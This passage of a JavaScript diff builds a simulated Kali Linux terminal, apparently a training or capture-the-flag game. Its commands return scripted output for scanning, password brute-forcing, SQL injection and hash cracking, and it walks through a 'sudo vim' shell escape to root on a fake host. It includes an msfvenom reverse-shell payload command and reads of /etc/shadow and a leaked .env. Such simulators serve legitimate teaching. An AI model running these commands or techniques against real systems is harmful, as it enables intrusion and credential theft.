+      S.extraFiles.map(f=>'  '+esc(f)).join(''));
+  }
+};
+CMDS.ll=async a=>CMDS.ls('-la');
+
+CMDS.cd=async(a)=>{
+  const t=(a||'').trim();
+  if(t===''||t==='~'||t==='/home/kali'){S.cwd='~';return;}
+  if(t==='..'){S.cwd='~';return;}
+  if(t==='ops'||t==='~/ops'){S.cwd='~/ops';return;}
+  if(S.extraDirs.includes(t)){S.cwd='~/'+t;return;}
+  if(['Desktop','Documents','Downloads','Music','Pictures','Public','Templates','Videos'].includes(t)){S.cwd='~/'+t;return;}
+  T('cd: no such file or directory: '+t,'rd');S.lastErr=true;
+};
+
+CMDS.cat=async(a,raw,asRoot)=>{
+  const names=a.split(/\s+/).filter(Boolean);
+  if(!names.length){T('cat: missing operand');S.lastErr=true;return;}
+  for(let n of names){
+    const k=resolveFile(n);
+    if(k==='/etc/shadow'&&!asRoot&&!S.root){T('cat: /etc/shadow: Permission denied','rd');S.lastErr=true;continue;}
+    if(FILES[k]!==undefined){
+      for(const l of FILES[k].split('\n'))P(esc(l));
+    }else if(S.extraFiles.includes(n)){
+      // file kosong hasil touch
+    }else if(k.startsWith('/root/')||k.startsWith('/etc/nginx')){
+      T('cat: '+n+': Permission denied','rd');S.lastErr=true;
+    }else{
+      T('cat: '+n+': No such file or directory','rd');S.lastErr=true;
+    }
+  }
+};
+
+CMDS.sudo=async(a)=>{
+  if(!await askSudo())return;
+  const rest=a.trim();
+  if(rest===''||rest==='-h'||rest==='--help'){T('usage: sudo [-h] command');return;}
+  if(rest==='-i'||rest==='su'||rest==='su -'||rest==='-s'){S.root=true;return;}
+  if(rest==='cat /etc/shadow'){await CMDS.cat('/etc/shadow',null,true);return;}
+  if(rest.startsWith('chmod')||rest.startsWith('chown')||rest.startsWith('systemctl')){return;}
+  // jalankan sub-command sebagai root
+  const [n2,...r2]=rest.split(/\s+/);
+  if(CMDS[n2]){await CMDS[n2](r2.join(' '),rest,true);}
+  else{T('sudo: '+n2+': command not found','rd');S.lastErr=true;}
+};
+CMDS.su=async()=>{await askSudo();S.root=true;};
+
+CMDS.ifconfig=async()=>{await emit([
+'<b class="gr">eth0</b>: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500',
+'        inet <b class="wh">192.168.1.17</b>  netmask 255.255.255.0  broadcast 192.168.1.255',
+'        inet6 fe80::a00:27ff:fe8b:3c51  prefixlen 64  scopeid 0x20&lt;link&gt;',
+'        ether 08:00:27:8b:3c:51  txqueuelen 1000  (Ethernet)',
+'        RX packets 284221  bytes 301234567 (287.2 MiB)',
+'        TX packets 152034  bytes 18234567 (17.3 MiB)',
+'',
+'<b class="gr">lo</b>: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536',
+'        inet 127.0.0.1  netmask 255.0.0.0',
+'        loop  txqueuelen 1000  (Local Loopback)'
+],8);};
+CMDS.ip=async(a)=>{if(a.startsWith('a')){await emit(['1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000','    inet 127.0.0.1/8 scope host lo','2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000','    inet <b class="wh">192.168.1.17/24</b> brd 192.168.1.255 scope global dynamic eth0'],8);}else{T('Usage: ip [ OPTIONS ] OBJECT { COMMAND | help }');};};
+CMDS.arp=async()=>{await emit([['Address                  HWtype  HWaddress           Flags Mask            Iface','bd'],['192.168.1.1              ether   08:00:27:11:aa:02   C                     eth0'],['192.168.1.20             ether   08:00:27:4a:1f:9c   C                     eth0']],10);};
+CMDS.ss=async()=>{await emit([['Netid State  Local Address:Port      Peer Address:Port','bd'],['tcp   ESTAB  192.168.1.17:52144      192.168.1.20:22','wh'],['tcp   LISTEN 0.0.0.0:22              0.0.0.0:*','wh'],['tcp   LISTEN 127.0.0.1:5432          0.0.0.0:*','wh']],8);};
+CMDS.ps=async()=>{await emit([['    PID TTY          TIME CMD','bd'],['    812 tty1     00:00:00 zsh','   1093 tty1     00:00:00 ps']],8);};
+CMDS.free=async()=>{await emit([['               total        used        free      shared  buff/cache   available','bd'],['Mem:         8132564     2941128     3012456      318408     2178980     4623108'],['Swap:        2097148           0     2097148']],8);};
+CMDS.df=async()=>{await emit([['Filesystem     1K-blocks     Used Available Use% Mounted on','bd'],['/dev/sda1       61255492 28411032  29699884  49% /','tmpfs            4066268    84012   3982256   3% /dev/shm','/dev/sda15      5763216     6144   5757072   1% /boot/efi']],8);};
+
+CMDS.ping=async(a)=>{
+  const host=a.split(/\s+/).pop();
+  if(!host||host==='ping'){T('ping: usage error: Destination address required','rd');S.lastErr=true;return;}
+  const okHost=host===TARGET||host==='192.168.1.1'||host==='kali'||host==='localhost'||host==='8.8.8.8';
+  T('PING '+host+' ('+host+') 56(84) bytes of data.');
+  if(okHost){
+    for(let i=1;i<=4;i++){await wait(S.fast?0:R(220,420));if(S.aborted){P('<span class="rd">^C</span>');break;}
+      T('64 bytes from '+host+': icmp_seq='+i+' ttl=64 time=0.'+R(28,71)+' ms');}
+    await emit(['','--- '+host+' ping statistics ---','4 packets transmitted, 4 received, 0% packet loss, time 3054ms','rtt min/avg/max/mdev = 0.281/0.402/0.512/0.071 ms'],8);
+  }else{
+    await wait(S.fast?0:900);
+    await emit(['^C','--- '+host+' ping statistics ---','4 packets transmitted, 0 received, <b class="rd">100% packet loss</b>, time 3061ms'],8);S.lastErr=true;
+  }
+};
+
+CMDS.curl=async(a)=>{
+  if(a.includes('/backup/.env')){await emit(LOOT_ENV.split('\n').map(l=>[l,l.startsWith('#')?'gy':'wh',10]),10);return;}
+  if(a.includes(TARGET)){await emit(['&lt;!DOCTYPE html&gt;','&lt;html&gt;&lt;head&gt;&lt;title&gt;Acme Corp | Intranet Portal&lt;/title&gt;&lt;/head&gt;','&lt;body&gt;&lt;h1&gt;Welcome to Acme Intranet&lt;/h1&gt;','&lt;!-- build 2026.08.14 - do not expose /backup --&gt;','&lt;/body&gt;&lt;/html&gt;'],10);return;}
+  T('curl: (7) Failed to connect to '+((a.match(/https?:\/\/([^/\s"]+)/)||[])[1]||'host')+': Connection refused','rd');S.lastErr=true;
+};
+CMDS.wget=async(a)=>{
+  const u=(a.match(/https?:\/\/\S+/)||[''])[0]||'http://'+TARGET+'/backup/db.sql.gz';
+  await emit(['--2026-08-25 '+clock()+'--  '+u,'Resolving host... done.','Connecting: connected.','HTTP request sent, awaiting response... <b class="gr">200 OK</b>','Length: 1844321 (1.8M) [application/gzip]','Saving to: \u2018db.sql.gz\u2019','',
+  'db.sql.gz          100%[===================&gt;]   1.76M  4.12MB/s    in 0.4s','','\u2018db.sql.gz\u2019 saved [1844321/1844321]'],30);
+};
+
+CMDS.nmap=async(a)=>{
+  if(!a.trim()){await emit(['Nmap 7.95SVN ( https://nmap.org )','Usage: nmap [Scan Type(s)] [Options] {target specification}','The most common uses of nmap are simple scans of hosts:','','  nmap -sV -p80 <target>','  nmap -sS -sV -O <target>','  nmap -sn <subnet>'],8);return;}
+  if(a.includes(TARGET)||a.includes('web-prod')){await emit(nmapOutput(),18);}
+  else if(a.includes('scanme.nmap.org')){await emit([['Starting Nmap 7.95SVN ( https://nmap.org ) at 2026-08-25 '+clock(),'wh'],['Nmap scan report for scanme.nmap.org (45.33.32.156)','Host is up (0.21s latency).','PORT      STATE  SERVICE','22/tcp    open   ssh','80/tcp    open   http','9929/tcp  open   nping-echo','31337/tcp open   Elite','','Nmap done: 1 IP address (1 host up) scanned in 8.02 seconds']],20);}
+  else{await emit([['Starting Nmap 7.95SVN ( https://nmap.org ) at 2026-08-25 '+clock(),'wh'],['Note: Host seems down.','Nmap done: 1 IP address (0 hosts up) scanned in 2.01 seconds']],30);}
+};
+
+CMDS.hydra=async(a)=>{
+  const wl=['123456','password','admin123','letmein','qwerty123','welcome1','dragon','sunshine','football','monkey',PASS];
+  await emit([
+  ['Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these laws suck)','gy',20],
+  ['','wh',4],
+  ['Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-25 '+clock(),'wh',30],
+  ['[WARNING] Many SSH configurations/settings do not support parallel connections. It is recommended to reduce parallel connections to 1 (-t 1).','yl',40],
+  ['[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task','wh',20],
+  ['[DATA] attacking ssh://'+TARGET+':22/','wh',60]
+  ],10);
+  if(a.includes(TARGET)){
+    for(let i=0;i<wl.length;i++){
+      if(S.aborted){P('<span class="rd">^C</span>');return;}
+      await wait(S.fast?0:R(160,380));
+      T('[ATTEMPT] target '+TARGET+' - login "admin" - pass "'+wl[i]+'" - '+(i+1)+' of 14344399 [child '+(i%4)+'] (0/0)','gy');
+    }
+    await wait(S.fast?0:400);
+    P('[22][ssh] host: <b class="wh">'+TARGET+'</b>   login: <b class="wh">admin</b>   password: <b class="gr">'+PASS+'</b>');
+    await emit(['1 of 1 target successfully completed, <b class="gr">1 valid password found</b>','Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-25 '+clock()],20);
+  }else{
+    for(let i=0;i<4;i++){if(S.aborted){P('<span class="rd">^C</span>');return;}await wait(S.fast?0:220);T('[ATTEMPT] target ... - login "admin" - pass "'+wl[i]+'" - '+(i+1),'gy');}
+    await emit(['[ERROR] could not connect to target: connection refused','0 of 1 target completed, 0 valid passwords found','Hydra finished with errors at 2026-08-25 '+clock()],20);S.lastErr=true;
+  }
+};
+
+CMDS.gobuster=async(a)=>{
+  if(!a.includes('-u')){T('Usage: gobuster dir -u <url> -w <wordlist>','rd');S.lastErr=true;return;}
+  if(a.includes(TARGET)){await emit(gobusterOutput(),14);}
+  else{await emit([['===============================================================','cy'],['Gobuster v3.6','===============================================================','Starting gobuster in directory scanning mode','===============================================================','Finished','===============================================================']],20);}
+};
+
+CMDS.nikto=async(a)=>{await emit([
+ ['- Nikto v2.5.0','---------------------------------------------------------------------------','+ Target IP:          192.168.1.20','+ Target Hostname:    web-prod-01.lan','+ Target Port:        80','+ Start Time:         2026-08-25 '+clock()+' (GMT7)','---------------------------------------------------------------------------','+ Server: Apache/2.4.58 (Ubuntu) PHP/8.1.27','+ /: The anti-clickjacking X-Frame-Options header is not present.','+ /robots.txt: contains 2 entries which should be manually viewed.','+ /backup/: Directory indexing found.','+ /backup/.env: <b class="rd">Sensitive file exposed (environment variables).</b>','+ Apache/2.4.58 appears outdated (check latest release).','+ 10348 requests: 0 error(s) and 6 item(s) reported on remote host','+ End Time:           2026-08-25 '+clock().replace(/\d\d$/,'47')+' (GMT7) (52 seconds)','---------------------------------------------------------------------------','+ 1 host(s) tested'],18);};
+
+CMDS.sqlmap=async(a)=>{
+  const banner=['        ___','       /H|','      [.]H|  __  {__}   ___  {__}','      [.]H| /  \\ {__}  /__   {__}  {__}','      [.]H| \\__  {__}  \\__   {__} {__}','      [.]H|  __/ {__}     /   {__}  \\__','      [.]H| /    {__} \\__/    {__}  {__}','      [.]H| \\___ {__}  \\___   \\__   \\__/','      [/]H|','       /|.|','      (___)','        /','      <b class="wh">sqlmap/1.9.2#stable</b> - automatic SQL injection and database takeover tool','      https://sqlmap.org'];
+  if(!a.includes('-u')){await emit(banner,6);T('Usage: sqlmap -u <url> [options]','rd');S.lastErr=true;return;}
+  await emit(banner,4);
+  await emit([
+  ['[*] starting @ '+clock()+' [INFO] testing connection to the target URL','wh',120],
+  ['[INFO] checking if the target is protected by some kind of WAF/IPS','wh',200],
+  ['[INFO] testing if the target URL content is stable','wh',180],
+  ['[INFO] target URL content is stable','wh',120],
+  ['[INFO] testing if GET parameter \'id\' is dynamic','wh',160],
+  ['[INFO] GET parameter \'id\' appears to be dynamic','gr',140],
+  ['[INFO] heuristic (basic) test shows that GET parameter \'id\' might be injectable','wh',140],
+  ['[INFO] testing for SQL injection on GET parameter \'id\'','wh',200],
+  ['[INFO] testing \'AND boolean-based blind - WHERE or HAVING clause\'','gy',160],
+  ['[INFO] GET parameter \'id\' appears to be <b class="gr">\'AND boolean-based blind - WHERE or HAVING clause\'</b> injectable','gr',200],
+  ['[INFO] testing \'Time-based blind SQL injection\'','gy',160],
+  ['[INFO] GET parameter \'id\' appears to be <b class="gr">\'MySQL >= 5.6 AND time-based blind\'</b> injectable','gr',200],
+  ['[INFO] the back-end DBMS is MySQL','wh',120],
+  ['web application technology: PHP 8.1.27, Apache 2.4.58','wh',60],
+  ['back-end DBMS: MySQL >= 5.6','wh',60],
+  ['[INFO] fetched data logged to text files under \'/home/kali/.local/share/sqlmap/'+TARGET+'\'','gy',60],
+  ['[*] ending @ '+clock(),'wh',20]
+  ],10);
+};
+
+CMDS.john=async(a)=>{
+  if(!a.includes('hash')){T('Usage: john [OPTIONS] [PASSWORD-FILES]','rd');S.lastErr=true;return;}
+  await emit([
+  ['Warning: detected hash type "Raw-MD5", but the string is also recognized as "Raw-MD4"','yl'],
+  ['Use the "--format=Raw-MD4" option to force loading these as that type instead','gy'],
+  ['Using default input encoding: UTF-8','wh'],
+  ['Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])','wh',200],
+  ['Press \'q\' or Ctrl-C to abort, almost any other key for status','gy',400],
+  ['<b class="gr">password</b>         (admin)','wh',300],
+  ['1g 0:00:00:00 DONE (2026-08-25 '+clock()+') 12.50g/s 819200p/s 819200c/s 819200s/s 123456..whitetiger','gy'],
+  ['Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably','gy'],
+  ['Session completed.','wh']
+  ],12);
+};
+CMDS.hashcat=async(a)=>{
+  if(!a.trim()){T('hashcat: no arguments given — try: hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt','yl');return;}
+  await emit([
+  ['hashcat (v6.2.6) starting','','OpenCL API (OpenCL 3.0) - Platform #1 [Mesa]','* Device #1: llvmpipe (LLVM 19.1.0, 256 bits), 1985/3971 MB allocable','','Minimum password length supported by kernel: 0','Maximum password length supported by kernel: 256','','<b class="gr">5f4dcc3b5aa765d61d8327deb882cf99:password</b>','','Session..........: hashcat','Status...........: Cracked','Progress.........: 14344384/14344384 (100.00%)','Time.Started.....: Tue Aug 25 '+clock()+' (1 min 12 secs)','Time.Estimated....: Tue Aug 25 '+clock()+' (0 secs)'],16);
+};
+CMDS.searchsploit=async(a)=>{
+  const q=a.trim()||'apache';
+  await emit([
+  ['---------------------------------------------------------------------------------','cy'],
+  [' Exploit Title'.padEnd(62)+'|  Path','wh'],
+  ['---------------------------------------------------------------------------------','cy'],
+  [' Apache 2.4.49 - Path Traversal & Remote Code Execution'.padEnd(62)+'| multiple/remote/50383.py'],
+  [' Apache 2.4.50 - Path Traversal / Remote Code Execution'.padEnd(62)+'| multiple/remote/50406.py'],
+  [' OpenSSH 8.9 - Username Enumeration'.padEnd(62)+'| linux/remote/50973.py'],
+  [' vsftpd 3.x - Banner exploit (deny)' + ''.padEnd(10)+'| linux/remote/49723.txt'],
+  [' WordPress 6.x - SQLi (authenticated)'.padEnd(62)+'| php/webapps/51422.py'],
+  ['---------------------------------------------------------------------------------','cy'],
+  ['Shellcodes: No Results','gy']
+  ],8);
+};
+CMDS.masscan=async(a)=>{await emit([['Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2026-08-25 '+clock(),'wh'],['Initiating SYN Stealth Scan','Scanning 1 hosts [1000 ports/host]'],['Discovered open port <b class="gr">22/tcp</b> on 192.168.1.20'],['Discovered open port <b class="gr">80/tcp</b> on 192.168.1.20'],['Discovered open port <b class="gr">3306/tcp</b> on 192.168.1.20']],40);};
+CMDS.msfvenom=async(a)=>{
+  if(!a.includes('-p')){T('Error: no payload selected — contoh: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.17 LPORT=4444 -f elf -o payload.elf','rd');S.lastErr=true;return;}
+  await emit([['[-] No platform was selected. Choosing msf::Module::Platform::Linux from the payload','yl',80],['[*] python -> shkod',40]&&['No encoder specified, outputting raw payload','wh',60],['Payload size: 511 bytes','wh',60],['Saved as: payload.elf','gr',40]],12);
+};
+CMDS.wifite=async(a,raw,asRoot)=>{
+  if(!S.root&&!asRoot){T('wifite: must run as root (gunakan: sudo wifite)','rd');S.lastErr=true;return;}
+  await emit([
+  ['','wh',2],
+  {h:'   <b class="gr">WIFITE v2.7.0</b>  (github.com/derv82/wifite2)',d:30},
+  ['','wh',4],
+  [' [*] Enabling monitor mode on wlan0...','wh',160],
+  [' [*] Scanning for wireless networks...','wh',300],
+  ['','wh',4],
+  {h:'   NUM  BSSID              CH  PWR  ENC    ESSID',d:10},
+  {h:'     1  <b class="cy">AA:BB:CC:11:22:33</b>   6  -42  WPA2   <b class="wh">AcmeCorp-5G</b>',d:10},
+  {h:'     2  <b class="cy">AA:BB:CC:11:22:34</b>  11  -58  WPA2   AcmeCorp-Guest',d:10},
+  {h:'     3  <b class="cy">D4:6E:0E:77:9A:01</b>   1  -71  WPA2   HomeNet_2.4',d:10},
+  {h:'     4  <b class="cy">00:14:22:01:23:45</b>   9  -77  OPN    KopiTamu-Free',d:10},
+  ['','wh',4],
+  [' [!] Attack dibatalkan: hanya network dalam scope SOW-2026-0814 yang boleh diuji.','yl',40],
+  [' [!] Gunakan --target untuk memilih network secara eksplisit.','gy',20]
+  ],10);
+};
+CMDS.aircrack=async()=>{T('Aircrack-ng 1.7 — usage: aircrack-ng [options] <capture file(s)>');};
+CMDS.aircrack=CMDS.aircrack;
+
+CMDS.msfconsole=async()=>{
+  await emit(msfBanner(),6);
+  S.mode='msf';S.msf={module:''};
+};
+
+CMDS.vim=async(a)=>openVim(a.trim()?resolveFile(a.trim()):'ops/target.txt');
+CMDS.nano=async(a)=>openVim(a.trim()?resolveFile(a.trim()):'ops/target.txt');
+
+CMDS.man=async(a)=>{
+  const t=(a||'').split(/\s+/).pop()||'';
+  const body=[
+   (t||'MANUAL')+'(1)'.padEnd(8)+'User Commands'+(t||'MANUAL')+'(1)'.padStart(8),'','',
+   'NAME','       '+(t||'manual')+' — Kali Linux manual page','',
+   'SYNOPSIS','       '+t+' [OPTION]... [ARG]...','',
+   'DESCRIPTION','       Halaman manual lengkap tersedia pada sistem terpasang.',
+   '       (END) — tekan q untuk keluar'
+  ];
+  openPager(body);
+};
+
+CMDS.python3=async()=>{
+  T('Python 3.12.4 (main, Jun 25 2026, 11:26:29) [GCC 13.3.0] on linux');
+  T('Type "help", "copyright", "credits" or "license" for more information.');
+  S.mode='py';
+};
+
+CMDS.touch=async(a)=>{if(a.trim())S.extraFiles.push(a.trim());};
+CMDS.mkdir=async(a)=>{if(a.trim().replace('-p ',''))S.extraDirs.push(a.trim().replace('-p ',''));};
+CMDS.chmod=async()=>{};
+CMDS.rm=async(a)=>{
+  if(/-rf?\s+\/(\*)?$/.test(a)){T("rm: it is dangerous to operate recursively on '/'","rd");T("rm: it is dangerous to operate recursively on '/'","rd");T("rm: use --no-preserve-root to override",'yl');S.lastErr=true;return;}
+};
+CMDS.grep=async(a)=>{
+  const m=a.match(/^(-\w+\s+)?(\S+)\s+(\S+)$/);
+  if(!m){T('Usage: grep [OPTION]... PATTERNS... [FILE]...','rd');S.lastErr=true;return;}
+  const pat=m[2],f=resolveFile(m[3]);
+  const src=FILES[f];
+  if(src===undefined){T('grep: '+m[3]+': No such file or directory','rd');S.lastErr=true;return;}
+  let found=false;
+  for(const l of src.split('\n')){
+    if(l.toLowerCase().includes(pat.toLowerCase().replace(/["']/g,''))){P(esc(l).replace(new RegExp('('+pat.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+')','i'),'<b class="rd">$1</b>'));found=true;}
+  }
+  if(!found)S.lastErr=true;
+};
+CMDS.find=async(a)=>{
+  if(a.includes('4000')||a.includes('u=s')){
+    await emit(['/usr/bin/su','/usr/bin/sudo','/usr/bin/passwd','/usr/bin/chsh','/usr/bin/gpasswd','/usr/bin/newgrp','/usr/bin/mount','/usr/bin/umount','/usr/bin/pkexec','/usr/sbin/pppd','/usr/lib/dbus-1.0/dbus-daemon-launch-helper'],14);
+  }else{await emit(['/home/kali/ops/target.txt','/home/kali/ops/loot.env','/home/kali/ops/breach.sh'],14);}
+};
+CMDS.which=async(a)=>{
+  const map={nmap:'/usr/bin/nmap',hydra:'/usr/bin/hydra',sqlmap:'/usr/bin/sqlmap',msfconsole:'/usr/bin/msfconsole',python3:'/usr/bin/python3',vim:'/usr/bin/vim',john:'/usr/sbin/john',hashcat:'/usr/bin/hashcat',gobuster:'/usr/bin/gobuster'};
+  const k=a.trim().split(/\s+/).pop();
+  if(map[k])T(map[k]);else S.lastErr=true;
+};
+CMDS.apt=async()=>{T('apt 2.9.8 (amd64) — usage: apt [options] command');};
+CMDS.nc=async()=>{T('This is nc.openbsd 1.226 — usage: nc [-lvp] [port]');};
+CMDS.ssh=async(a)=>{
+  const m=a.match(/([\w.-]+)@([\d.]+)/);
+  if(!m){T('usage: ssh [-p port] user@destination','rd');S.lastErr=true;return;}
+  const u=m[1],h=m[2];
+  if(h!==TARGET){await wait(S.fast?0:800);T('ssh: connect to host '+h+' port 22: No route to host','rd');S.lastErr=true;return;}
+  if(u!=='admin'){await wait(S.fast?0:600);T(u+'@'+h+': Permission denied (publickey).','rd');S.lastErr=true;return;}
+  for(let tries=0;tries<3;tries++){
+    const pw=await readLine(u+'@'+h+"'s password: ",true);
+    if(pw===null)return;
+    if(pw===PASS){
+      await emit([
+       ['Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-105-generic x86_64)','wh',10],
+       ['','wh',2],
+       [' * Documentation:  https://help.ubuntu.com','gy',4],
+       [' * Management:     https://landscape.canonical.com','gy',4],
+       [' * Support:        https://ubuntu.com/advantage','gy',8],
+       ['','wh',2],
+       ['Last login: Mon Aug 24 22:51:08 2026 from 192.168.1.17','wh',10]
+      ],8);
+      S.mode='remote';S.remote={user:'admin',host:'web-prod-01',root:false,cwd:'~'};
+      return;
+    }
+    T(u+'@'+h+': Permission denied, please try again.','rd');
+  }
+  T(u+'@'+h+': Permission denied (publickey,password).','rd');S.lastErr=true;
+};
+
+CMDS.neofetch=async()=>{
+  const art=[
+   '              ....             ',
+   '        .,;:ccc::;,\'..         ',
+   '     .,cc:;\'......\',;:cc,.     ',
+   '   .,c:\'    .,:cc:.    \':c,.   ',
+   '  .c:\'    .:c:..,,:c:.   \':c.  ',
+   '  c:    .:c:   .xXx. :c.   :c  ',
+   ' .c;    .c:    \\XXX/  cc    ;c. ',
+   ' .c;    .c:     \\X/   cc    ;c. ',
+   '  c:    .c:.    .:.  .c:   :c  ',
+   '  \'c:.   \'cc:.      .cc\' .,c\'  ',
+   '   \':cc:.. \':cccccccc:\' .cc:\'   ',
+   '     .,:cccc::;;;:::ccc:;,.    ',
+   '         ..,;:cccccc:;,.       '];
+  const info=[
+   '<b class="cy bd">kali</b>@<b class="cy bd">kali</b>','<span class="gy">----------</span>',
+   '<b class="cy bd">OS</b>: Kali GNU/Linux Rolling x86_64','<b class="cy bd">Kernel</b>: 6.12.20-kali1-amd64',
+   '<b class="cy bd">Uptime</b>: 3 hours, 41 mins','<b class="cy bd">Packages</b>: 3427 (dpkg)',
+   '<b class="cy bd">Shell</b>: zsh 9.9','<b class="cy bd">Resolution</b>: 1920x1080',
+   '<b class="cy bd">DE</b>: XFCE 4.20','<b class="cy bd">WM</b>: Xfwm4',
+   '<b class="cy bd">Theme</b>: Kali-Dark [GTK2/3]','<b class="cy bd">CPU</b>: Intel i7-9750H (6) @ 2.600GHz',
+   '<b class="cy bd">Memory</b>: 2871MiB / 7942MiB'];
+  for(let i=0;i<Math.max(art.length,info.length);i++){
+    P('<span class="bl">'+esc(art[i]||'').padEnd(32)+'</span>'+(info[i]||''));
+    await wait(S.fast?0:12);
+  }
+};
+
+CMDS.exit=async()=>{
+  if(S.root){S.root=false;return;}
+  T('logout');S.nextMode='busy';hideBar();
+  BL();T('Kali GNU/Linux Rolling kali tty1','wh');BL();
+  await loginLoop();
+};
+CMDS.logout=CMDS.exit;
+CMDS.reboot=async()=>{S.nextMode='boot';S.fast=false;TERM.innerHTML='';await wait(S.fast?0:300);boot();};
+CMDS.shutdown=async()=>{
+  S.nextMode='off';hideBar();
+  await emit([['Broadcast message from root@kali ('+clock()+'):','','The system will power off NOW!','wh',200],
+   {h:'<span class="gr">[<b class="bd">  OK  </b>]</span> Stopped target Multi-User System.',d:40},
+   {h:'<span class="gr">[<b class="bd">  OK  </b>]</span> Stopped OpenBSD Secure Shell server.',d:40},
+   {h:'<span class="gr">[<b class="bd">  OK  </b>]</span> Reached target System Shutdown.',d:60},
+   ['[  142.221807] reboot: Power down','gy',80]],10);
+  P('<span class="gy dim">(tekan tombol apa pun untuk menyalakan ulang)</span>');
+};
+
+/* alias */
+CMDS['./ops/breach.sh']=CMDS['bash']=null;
+CMDS.ll=CMDS.ll||null;
+
+/* ══════════════ shell dispatcher ══════════════ */
+async function runShell(line){
+  line=line.trim().replace(/;+$/,'');
+  if(!line)return;
+  S.hist.push(line);S.histIdx=S.hist.length;
+  S.lastErr=false;
+
+  if(line==='./ops/breach.sh'||line==='bash ops/breach.sh'||line==='sh ops/breach.sh'){await breach();return;}
+  if(line.startsWith('sudo ')){await CMDS.sudo(line.slice(5));return;}
+  if(line==='sudo'){T('usage: sudo [-h] command','rd');S.lastErr=true;return;}
+
+  const parts=line.split(/\s+/),name=parts[0],args=parts.slice(1).join(' ');
+  if(name==='ll'){await CMDS.ls('-la');return;}
+  const h=CMDS[name];
+  if(h){await h(args,line);}
+  else if(['gnome-terminal','xfce4-terminal','xterm'].includes(name)){T(name+': cannot open display: (standalone mode)','rd');S.lastErr=true;}
+  else{T('zsh: command not found: '+name,'rd');S.lastErr=true;}
+}
+
+/* ══════════════ remote shell (target) ══════════════ */
+const REMOTE_FILES={
+ 'user.txt':'FLAG{f00th0ld_0bt41n3d_v1a_cr3d_r3us3}',
+ '~/user.txt':'FLAG{f00th0ld_0bt41n3d_v1a_cr3d_r3us3}',
+ '/home/admin/user.txt':'FLAG{f00th0ld_0bt41n3d_v1a_cr3d_r3us3}',
+ '.bash_history':'ls -la\ncat /etc/nginx/sites-enabled/default\nsudo -l\nsudo vim /etc/nginx/nginx.conf\nhistory | grep sudo\nexit',
+ '~/.bash_history':'ls -la\ncat /etc/nginx/sites-enabled/default\nsudo -l\nsudo vim /etc/nginx/nginx.conf\nhistory | grep sudo\nexit',
+ '/root/root.txt':'FLAG{r00t_0n_w3b-pr0d-01__25-08-2026}',
+ '/etc/passwd':'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nadmin:x:1001:1001:Admin User:/home/admin:/bin/bash\nmysql:x:118:126:MySQL Server:/nonexistent:/bin/false',
+ '/etc/shadow':'root:$y$j9T$mN2kP8qW5xZ1vR4tY7uB.$K8fD3jL9sA2wQ6eT1yU4iO7pZ0xC5vB8nM3hG9a:19900:0:99999:7:::\nadmin:$y$j9T$qX8vB2zW1mN0pR5sK7cH.$Lk3dJ9fYt2vXw8mZpQ6nB4rT1sU5aG7eC0hD3iO9f:19950:0:99999:7:::'
+};
+async function runRemote(line){
+  line=line.trim();if(!line)return;
+  const rm=S.remote;
+  const parts=line.split(/\s+/),name=parts[0],args=parts.slice(1).join(' ');
+  const nf=()=>{T('bash: '+name+': command not found','rd');S.lastErr=true;};
+  S.lastErr=false;
+  if(name==='exit'||name==='logout'){
+    if(rm.root){rm.root=false;S.mode='remote';return;}
+    T('Connection to 192.168.1.20 closed.','gy');S.remote=null;S.nextMode='shell';return;
+  }
+  if(rm.root&&name==='cat'){
+    const f=args.trim();
+    if(REMOTE_FILES[f]){for(const l of REMOTE_FILES[f].split('\n'))T(l);return;}
+    T('cat: '+f+': No such file or directory','rd');S.lastErr=true;return;
+  }
+  if(name==='sudo'){
+    if(args===''||args==='-h'){T('usage: sudo command');return;}
+    if(args==='-l'){
+      await emit(['Matching Defaults entries for admin on web-prod-01:','    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin','','User admin may run the following commands on web-prod-01:','    <b class="yl">(root) NOPASSWD: /usr/bin/vim /etc/nginx/nginx.conf</b>'],10);return;
+    }
+    if(args.startsWith('vim')&&args.includes(':!/bin/sh')){rm.root=true;S.mode='remote';return;}
+    if(args.startsWith('vim')){openVim('/etc/nginx/nginx.conf',true);return;}
+    T('sudo: '+args.split(' ')[0]+': command not allowed','rd');S.lastErr=true;return;
+  }
+  if(name==='whoami'){T(rm.root?'root':'admin');return;}
+  if(name==='id'){T(rm.root?'uid=0(root) gid=0(root) groups=0(root)':'uid=1001(admin) gid=1001(admin) groups=1001(admin),1002(webdev)');return;}
+  if(name==='hostname'){T('web-prod-01');return;}
+  if(name==='uname'){T(args.includes('-a')?'Linux web-prod-01 5.15.0-105-generic #115-Ubuntu SMP x86_64 GNU/Linux':'Linux');return;}
+  if(name==='pwd'){T(rm.root?'/root':'/home/admin');return;}
+  if(name==='ls'){
+    if(rm.root){P('<b class="bl bd">.</b>  <b class="bl bd">..</b>  .bashrc  .profile  <b class="gr">root.txt</b>');}
+    else{P('<b class="bl bd">.</b>  <b class="bl bd">..</b>  .bash_history  .bashrc  .profile  <b class="gr">user.txt</b>  <b class="bl bd">www</b>');}
+    return;
+  }
+  if(name==='cat'){
+    const f=args.trim();
+    const key=rm.root?f:f;
+    if(REMOTE_FILES[key]||REMOTE_FILES['~/'+f]&&!f.startsWith('/')){
